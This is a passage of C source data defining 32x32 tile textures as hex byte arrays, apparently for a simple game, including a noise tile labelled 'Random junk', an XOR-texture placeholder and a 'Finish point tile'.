    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x07, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  },
  // Random junk
  { 32, 32, 0xCB, 0,0,0,0,0, // 1032 Bytes
    0xA1, 0x1F, 0xA1, 0x89, 0xA1, 0xA1, 0xCB, 0xBD, 0x99, 0x43, 0x27, 0x5F, 0xCB, 0x1A, 0xDE, 0xE9, 0x96, 0xAE, 0xC2, 0x43, 0x5D, 0x08, 0xF8, 0xF8, 0x23, 0xE3, 0x18, 0x18, 0x18, 0x1F, 0xE3, 0xE3,
    0x1F, 0x12, 0xB5, 0xA1, 0xA1, 0xA1, 0xCB, 0xDB, 0x43, 0xAF, 0x1B, 0x55, 0x5F, 0x55, 0xDE, 0xE9, 0x96, 0xAE, 0x43, 0x5D, 0x43, 0x18, 0x18, 0x18, 0x18, 0x18, 0xE3, 0xF8, 0x18, 0x1F, 0xF7, 0xB5,
    0x1F, 0x12, 0x99, 0xB5, 0xB5, 0xDB, 0xDB, 0xA1, 0x43, 0xBD, 0x55, 0x27, 0x5F, 0x27, 0x55, 0x55, 0x55, 0x55, 0x55, 0x5D, 0x08, 0xF8, 0xCB, 0xDB, 0xCB, 0xCB, 0xF8, 0x06, 0x18, 0xA1, 0x7D, 0x7D,
    0xCB, 0x12, 0xCB, 0xDB, 0xDB, 0xB5, 0xCB, 0x43, 0x3F, 0x55, 0x1B, 0x27, 0x5F, 0x12, 0x27, 0x12, 0x43, 0x60, 0xBB, 0x5D, 0x55, 0x55, 0x4A, 0xDB, 0xCB, 0xB3, 0xF8, 0x0C, 0x7D, 0x7D, 0x1F, 0x0C,
    0x20, 0x12, 0xCB, 0xDB, 0xCB, 0x89, 0xCB, 0x43, 0x55, 0xB5, 0x1B, 0x27, 0x5F, 0x99, 0x18, 0x43, 0xCB, 0x60, 0x08, 0x5D, 0x76, 0x55, 0x76, 0xDB, 0x0C, 0x0C, 0x7D, 0x7D, 0x18, 0x83, 0x0C, 0xB5,
    0x20, 0x12, 0x3C, 0x3C, 0xDB, 0x89, 0xCB, 0xAB, 0x55, 0x5E, 0x1B, 0xCB, 0x5F, 0x18, 0x43, 0x27, 0xBB, 0x60, 0x08, 0x5D, 0xB5, 0x55, 0x0C, 0x0C, 0x7D, 0x7D, 0x06, 0x83, 0x83, 0x1F, 0x0C, 0x91,
    0xBD, 0x20, 0xBD, 0xBD, 0xDB, 0xCB, 0x89, 0x55, 0x4A, 0x48, 0x1B, 0xA1, 0x5F, 0xCB, 0x43, 0x27, 0xBB, 0x60, 0xF8, 0x5D, 0x80, 0x55, 0x7D, 0x7D, 0xDB, 0x83, 0x83, 0x83, 0x18, 0x1F, 0x91, 0xCB,
    0x05, 0x20, 0xCB, 0xCB, 0xFC, 0xDB, 0x55, 0xCB, 0x4A, 0x43, 0x48, 0x48, 0x7D, 0x7D, 0x43, 0x27, 0x0A, 0x60, 0x5D, 0x0C, 0x7D, 0x7D, 0xC5, 0x83, 0x83, 0x83, 0x91, 0xA1, 0x1F, 0xF8, 0x18, 0x18,
    0x0B, 0xB5, 0x20, 0x05, 0x05, 0xDB, 0x55, 0xBD, 0x4A, 0x43, 0xB1, 0x7D, 0x5F, 0x48, 0x7D, 0x7D, 0x27, 0x24, 0x7D, 0x7D, 0xDF, 0x83, 0x83, 0x5E, 0x83, 0xCB, 0x18, 0x0C, 0x1F, 0xF8, 0x0C, 0x0C,
    0x22, 0xB5, 0x20, 0xD6, 0xD6, 0xD6, 0x55, 0xD6, 0x4A, 0x7D, 0x7D, 0x1B, 0x43, 0x5F, 0x43, 0x48, 0x7D, 0x7D, 0x60, 0x83, 0x83, 0x24, 0x83, 0x83, 0x06, 0xCB, 0xCB, 0x3B, 0x3B, 0x3B, 0x3B, 0x3B,
    0x0B, 0xB5, 0x22, 0x20, 0x6F, 0xCB, 0x55, 0x4A, 0x7D, 0x27, 0x43, 0x27, 0x43, 0x5F, 0x43, 0x27, 0x47, 0x27, 0x83, 0x27, 0x27, 0x83, 0x55, 0x3B, 0x3B, 0x3B, 0x3B, 0x1F, 0x18, 0xF8, 0x75, 0xAE,
    0xE3, 0xB5, 0x5E, 0x20, 0xA1, 0xCB, 0x55, 0x7D, 0x5E, 0xA7, 0xD2, 0x43, 0x18, 0x71, 0x6E, 0x27, 0x27, 0x83, 0x60, 0x3B, 0x83, 0x3B, 0x55, 0x06, 0xF1, 0x0C, 0x24, 0x24, 0x18, 0xE3, 0xAE, 0x91,
    0x52, 0x52, 0x52, 0xCB, 0x20, 0x7D, 0x7D, 0x6A, 0x6A, 0x6A, 0x6A, 0x6A, 0x1D, 0x71, 0x2F, 0x6E, 0x6E, 0x83, 0x60, 0xCB, 0x83, 0x36, 0x06, 0x6B, 0x6B, 0x6B, 0x6B, 0x6B, 0x6B, 0x6B, 0x91, 0xCB,
    0x6A, 0x6A, 0x6A, 0x6A, 0x7D, 0x52, 0x52, 0x55, 0x52, 0xCB, 0x27, 0x27, 0x6A, 0x71, 0x6A, 0x3B, 0x83, 0x6E, 0x6B, 0x83, 0x75, 0x6B, 0x6B, 0x55, 0x0C, 0x27, 0x1F, 0x18, 0xAE, 0x3B, 0x6B, 0x6B,
    0xA1, 0xCB, 0xE3, 0x7D, 0x53, 0x53, 0xE3, 0x55, 0x4A, 0x52, 0x52, 0x52, 0x71, 0x5F, 0x6A, 0x83, 0x4A, 0x60, 0x60, 0x83, 0x75, 0x4A, 0x4A, 0x4A, 0x55, 0x4A, 0x4A, 0x4A, 0x3B, 0x1D, 0xE3, 0xCB,
    0xC4, 0xC4, 0xC4, 0xE3, 0x7D, 0x22, 0x53, 0x55, 0x27, 0x4A, 0x10, 0x3C, 0x71, 0x5F, 0x51, 0x6A, 0x18, 0x60, 0x83, 0x75, 0x75, 0x75, 0x3B, 0x3B, 0x27, 0x55, 0x18, 0xAE, 0x4A, 0x4A, 0x4A, 0x4A,
    0xBD, 0xBD, 0xBD, 0xE3, 0x7D, 0x22, 0x14, 0x56, 0x53, 0x53, 0x53, 0x39, 0x73, 0x5F, 0x7C, 0x7C, 0x77, 0x83, 0x75, 0xEB, 0x43, 0x45, 0xDB, 0x27, 0x27, 0x1F, 0x55, 0xD2, 0xD2, 0x4A, 0x4A, 0x4A,
    0x6B, 0xA1, 0xCB, 0xBD, 0xE3, 0x7D, 0x56, 0x04, 0xD3, 0x27, 0x7C, 0x7C, 0x7C, 0x7C, 0x75, 0x60, 0x7C, 0x83, 0x5D, 0x43, 0x43, 0x43, 0x27, 0x20, 0x1F, 0x4A, 0x55, 0x4A, 0x4A, 0x35, 0xDB, 0x7D,
    0xE3, 0x6B, 0x6B, 0xAE, 0xAE, 0x56, 0x7D, 0x7C, 0x7C, 0x7C, 0x2F, 0x73, 0x5F, 0x42, 0x74, 0x55, 0x83, 0x7C, 0x5D, 0x31, 0x12, 0x43, 0x43, 0x4A, 0x4A, 0x18, 0x27, 0x55, 0x20, 0x7D, 0x7D, 0xE3,
    0xAE, 0xA1, 0xE3, 0x6B, 0x6B, 0x14, 0x7C, 0x7D, 0x3E, 0x39, 0x27, 0x73, 0x5F, 0x74, 0x2F, 0x83, 0x60, 0x7C, 0x5D, 0x31, 0xD2, 0x43, 0x4A, 0x1F, 0x18, 0x27, 0xE3, 0xD2, 0x7D, 0x55, 0xD2, 0xDB,
    0xCB, 0xA1, 0xCB, 0x56, 0x14, 0x6B, 0x7C, 0x7D, 0xCB, 0x3E, 0x43, 0x74, 0x5F, 0x74, 0x4A, 0x83, 0x6B, 0x7C, 0x6B, 0x6B, 0x31, 0x00, 0x4A, 0x43, 0x18, 0x27, 0x12, 0x7D, 0xE3, 0x67, 0x55, 0x55,
    0xF5, 0xCB, 0x56, 0xCB, 0x14, 0x7C, 0x0B, 0x23, 0x7F, 0x6B, 0x6B, 0x43, 0x74, 0x6B, 0x6B, 0x83, 0x60, 0x4A, 0x55, 0x5D, 0x6B, 0x6B, 0x43, 0x1F, 0x43, 0x7D, 0x7D, 0x89, 0x12, 0x12, 0xBD, 0xCB,
    0xCB, 0x56, 0xA1, 0xCB, 0x14, 0x7D, 0x23, 0xFD, 0x7F, 0x43, 0x43, 0x6B, 0x6B, 0x2F, 0x27, 0x83, 0x60, 0x27, 0x43, 0x5D, 0x55, 0x31, 0x6B, 0x7D, 0x7D, 0x43, 0x18, 0x89, 0x18, 0x18, 0x12, 0xBD,
    0x56, 0xBD, 0x45, 0x14, 0xFD, 0x7D, 0x23, 0x7F, 0xB5, 0x27, 0x04, 0x42, 0x5F, 0xC6, 0x2F, 0x83, 0x60, 0x43, 0x24, 0x5D, 0x18, 0x7D, 0x7D, 0x43, 0x6B, 0x6B, 0x43, 0x89, 0xBB, 0x06, 0xBB, 0x12,
    0xCB, 0xCB, 0xBD, 0x16, 0x0B, 0x7D, 0x3A, 0x7F, 0xC5, 0x27, 0xCB, 0x42, 0x5F, 0xE3, 0x2F, 0x83, 0x60, 0x2F, 0x43, 0x5D, 0x7D, 0x43, 0x55, 0x27, 0xA1, 0x43, 0x6B, 0x6B, 0xE3, 0x05, 0xCB, 0x6B,
    0xC5, 0xFD, 0xFD, 0x16, 0x23, 0xCB, 0x7D, 0x7F, 0x27, 0xBD, 0x42, 0x40, 0x5F, 0xDB, 0x2F, 0x83, 0xFF, 0x60, 0x7D, 0x7D, 0x5D, 0x18, 0x30, 0x55, 0xEB, 0xEB, 0xEB, 0x89, 0x6B, 0x6B, 0x6B, 0xE3,
    0xFD, 0xCB, 0xCB, 0x16, 0x23, 0x3A, 0x7F, 0xE3, 0x27, 0x27, 0x42, 0x5F, 0x27, 0x27, 0xDB, 0x83, 0x7D, 0x7D, 0x27, 0x0C, 0x5D, 0x2F, 0x30, 0x27, 0x55, 0x55, 0xEB, 0xEB, 0x1D, 0x1D, 0x1D, 0xDE,
    0xCB, 0x05, 0x05, 0x24, 0x3A, 0xCB, 0x7F, 0x24, 0xCB, 0xFD, 0x42, 0x5F, 0x18, 0x24, 0x27, 0x83, 0x12, 0x60, 0xAE, 0x0C, 0x5D, 0x18, 0x27, 0xDB, 0x27, 0x99, 0x55, 0x89, 0xF7, 0xFD, 0x1D, 0x1D,
    0xAB, 0xCB, 0x0B, 0x3A, 0x24, 0x24, 0x7F, 0xFD, 0xFD, 0x42, 0x40, 0x5F, 0x18, 0x7D, 0x7D, 0x83, 0xDB, 0x60, 0xE3, 0x0C, 0x5C, 0xDB, 0x27, 0x04, 0x27, 0x22, 0x99, 0x55, 0xCB, 0xF7, 0x05, 0x1D,
    0xF6, 0x0B, 0xF6, 0x3A, 0x16, 0x7F, 0x7D, 0xAE, 0xE3, 0x42, 0x40, 0x7D, 0x7D, 0x18, 0x24, 0x83, 0x1F, 0x60, 0xDB, 0x5C, 0x18, 0x9C, 0x1F, 0x27, 0x27, 0xFD, 0x99, 0x4A, 0x55, 0xF7, 0x05, 0xFD,
    0xFD, 0x0B, 0x3A, 0xFD, 0x16, 0x7F, 0x05, 0x7D, 0xE3, 0x42, 0x7D, 0x60, 0xBD, 0x18, 0x24, 0x83, 0x27, 0x60, 0x12, 0x5C, 0x18, 0xE3, 0x1F, 0x18, 0x27, 0xDB, 0xCB, 0xB5, 0xB5, 0x55, 0xB5, 0xB5,
    0x59, 0x3A, 0xCB, 0xCB, 0xAB, 0x7F, 0xCB, 0x7D, 0x7D, 0x7D, 0xA1, 0x60, 0xA1, 0x18, 0xBD, 0x83, 0x27, 0x60, 0x5C, 0x04, 0x18, 0x9C, 0x1F, 0x04, 0x27, 0x27, 0xB5, 0x99, 0x4A, 0x22, 0x55, 0x05,
  },
  {}, // (This is filled with the xor texture!)
  // Finish point tile
  { 32, 32, 0x00, 0,0,0,0,0, // 1032 Bytes
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00,
    0x00, 0x00, 0xFE, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00,
    0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0xFE, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFE, 0x00, 0x00, 0x00,
